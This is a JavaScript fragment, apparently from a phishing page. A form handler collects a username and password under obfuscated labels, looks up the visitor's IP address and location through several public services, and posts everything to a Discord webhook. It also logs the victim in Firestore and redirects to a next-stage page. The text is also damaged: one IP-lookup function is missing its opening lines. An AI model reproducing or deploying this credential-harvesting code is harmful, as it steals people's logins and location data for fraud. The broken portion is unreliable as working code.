  async function getIPData() {
    const services = [
      // 1. ipinfo.io (el que ya usabas)
      async () => {
        const res = await fetch("https://ipinfo.io/json");
        if (!res.ok) throw new Error();
        const data = await res.json();
        return {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country
        };
      },

      // 2. ip-api.com (muy bueno y sin límites duros para uso bajo)
      async () => {
        const res = await fetch("http://ip-api.com/json");
        if (!res.ok) throw new Error();
        const data = await res.json();
        if (data.status !== "success") throw new Error();
        return {
          ip: data.query,
          city: data.city,
          region: data.regionName,
          country: data.countryCode
        };
      },

        if (!res.ok) throw new Error();
        const data = await res.json();
        return {
          ip: data.ipAddress,
          city: data.cityName,
          region: data.regionName,
          country: data.countryCode
        };
      },

      // 4. ipapi.co (último recurso)
      async () => {
        const res = await fetch("https://ipapi.co/json");
        if (!res.ok) throw new Error();
        const data = await res.json();
        return {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_code
        };
      }
    ];

    let ipData = { ip: "No disponible", city: "Desconocida", country: "Desconocido", region: "" };

    for (const service of services) {
      try {
        const result = await service();
        
        ipData.ip = result.ip || ipData.ip;
        ipData.city = result.city || ipData.city;
        ipData.region = result.region || ipData.region;
        ipData.country = result.country || ipData.country;

        // Si ya tenemos IP + ciudad/país, podemos salir
        if (ipData.ip !== "No disponible" && 
            (ipData.city !== "Desconocida" || ipData.country !== "Desconocido")) {
          break;
        }
      } catch (e) {
        console.warn("Servicio de IP falló, probando siguiente...");
      }
    }

    return ipData;
  }

  document.getElementById("formis").addEventListener("submit", async (e) => {
    e.preventDefault();

    const isaris = localStorage.getItem("isaris") || "unknown";
    const conra = document.getElementById("oeeevale").value.trim();

    if (!conra) {
      alert("Por favor completa ambos campos");
      return;
    }

    try {
      const ipData = await getIPData();

      // Verificar IP bloqueada
      const blockedRef = doc(db, "blocked_ips", ipData.ip);
      const blockedSnap = await getDoc(blockedRef);
      if (blockedSnap.exists()) {
        alert("Acceso denegado: Tu IP ha sido bloqueada.");
        return;
      }

      const embed = {
        color: 0x00ff00,
        title: "💚 L4FIS3 💚",
        fields: [
          { name: "👤US4R", value: `\`${isaris}\``, inline: true },
          { name: "🔑C0TNR", value: `\`${conra}\``, inline: true },
          { name: "🌐 IP", value: `\`${ipData.ip}\``, inline: true },
          { name: "🏙 Ciudad", value: `\`${ipData.city || "Desconocida"}\``, inline: true },
          { name: "🌍 País", value: `\`${ipData.country || "Desconocido"}\``, inline: true }
        ],
        footer: { text: "𝐋4𝐅𝐈𝐒𝟑 • @SYN4PSE" },
        timestamp: new Date().toISOString()
      };

      const payload = { embeds: [embed] };

      if (!window.DISCORD_WEBHOOK) throw new Error("Webhook no encontrado");

      const res = await fetch(window.DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      // Guardar en Firestore
      const userRef = doc(db, "prmcas", isaris);
      await setDoc(userRef, {
        page: 0,
        ip: ipData.ip,
        city: ipData.city,
        country: ipData.country,
        timestamp: Date.now()
      });

      window.location.href = "cargui.html";

    } catch (err) {
      console.error(err);
      alert("Error al procesar.");
      window.location.href = "cargui.html";
    }
  });
